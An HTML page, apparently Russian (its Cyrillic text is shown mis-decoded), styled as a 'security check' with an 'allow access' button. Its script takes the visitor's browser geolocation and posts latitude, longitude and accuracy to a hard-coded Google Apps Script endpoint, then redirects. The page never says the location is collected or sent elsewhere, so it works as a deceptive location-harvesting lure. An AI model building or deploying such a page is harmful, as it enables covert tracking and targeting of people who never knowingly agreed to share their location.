<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background: #f0f0f0;
      color: #333;
      text-align: center;
    }
    .loader {
      margin-top: 20px;
      border: 6px solid #f3f3f3;
      border-top: 6px solid #333;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      display: none;
    }
    #consentBtn {
      padding: 12px 24px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h2>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h2>
  <button id="consentBtn">–†–∞–∑—Ä–µ—à–∏—Ç—å –¥–æ—Å—Ç—É–ø</button>
  <div class="loader"></div>

  <script>
    const loader = document.querySelector('.loader');
    const consentBtn = document.getElementById('consentBtn');

    // –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
    function buildBody(params) {
      return Object.keys(params)
        .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
        .join('&');
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
    if (!navigator.geolocation) {
      consentBtn.style.display = 'none';
      alert("–í–∞—à –±—Ä–∞—É–∑–µ—Ä —É—Å—Ç–∞—Ä–µ–ª –∏ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é!");
    }

    function requestGeolocation() {
      loader.style.display = 'block';
      consentBtn.style.display = 'none';

      navigator.geolocation.getCurrentPosition(
        pos => {
          console.log('–î–∞–Ω–Ω—ã–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:', pos.coords);
          sendLocation(pos);
        },
        err => {
          console.error('–û—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:', err);
          handleGeoError(err);
        },
        {
          enableHighAccuracy: false,
          timeout: 60000,
          maximumAge: 0
        }
      );
    }

    function sendLocation(pos) {
      const lat = pos.coords.latitude?.toFixed(6) || '0';
      const lon = pos.coords.longitude?.toFixed(6) || '0';
      const acc = pos.coords.accuracy?.toFixed(2) || '0';

      const scriptURL = 'https://script.google.com/macros/s/AKfycbwCC_Vmod7Io0zIv9DkPtYNjndCIHoFk6kkAz0gANpzMHnAfjAEyaDXSIalLKn1n2-W/exec';
      const body = buildBody({ lat, lon, acc });

      console.log('–û—Ç–ø—Ä–∞–≤–ª—è–µ–º—ã–µ –¥–∞–Ω–Ω—ã–µ:', body);

      fetch(scriptURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body
      })
      .then(response => {
        console.log('–°—Ç–∞—Ç—É—Å –æ—Ç–≤–µ—Ç–∞:', response.status);
        if (!response.ok) throw new Error(`–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: ${response.status}`);
        return response.json();
      })
      .then(data => {
        console.log('–£—Å–ø–µ—à–Ω—ã–π –æ—Ç–≤–µ—Ç:', data);
        window.location.href = "/next-page.html";
      })
      .catch(err => {
        console.error('–§–∞—Ç–∞–ª—å–Ω–∞—è –æ—à–∏–±–∫–∞:', err);
        alert('–û—à–∏–±–∫–∞ —Å–≤—è–∑–∏ —Å —Å–µ—Ä–≤–µ—Ä–æ–º: ' + err.message);
      })
      .finally(() => {
        loader.style.display = 'none';
        consentBtn.style.display = 'block';
      });
    }

    function handleGeoError(err) {
      const errorMessages = {
        1: "üîí –†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö –±—Ä–∞—É–∑–µ—Ä–∞",
        2: "üìç –û—à–∏–±–∫–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è:\n1. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç\n2. –í–∫–ª—é—á–∏—Ç–µ GPS\n3. –î–∞–π—Ç–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä—É",
        3: "‚è≥ –°–ª–∏—à–∫–æ–º –¥–æ–ª–≥–∏–π –æ—Ç–≤–µ—Ç. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ GPS –∞–∫—Ç–∏–≤–µ–Ω"
      };
      
      alert(errorMessages[err.code] || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞: " + err.message);
      loader.style.display = 'none';
      consentBtn.style.display = 'block';
    }

    consentBtn.addEventListener('click', requestGeolocation);
  </script>
</body>
</html>
